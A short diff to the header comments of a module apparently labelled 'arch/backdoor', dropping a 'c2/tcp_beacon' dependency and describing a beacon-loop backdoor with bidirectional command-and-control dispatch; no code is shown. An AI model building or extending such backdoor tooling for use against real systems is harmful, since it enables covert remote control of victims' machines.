@@ -1,5 +1,5 @@
 // chunk: arch/backdoor
-// depends: core/emit_buffer, c2/tcp_beacon
+// depends: core/emit_buffer
 // provides: main
 // note: beacon-loop backdoor with bidirectional C2 command dispatch
 
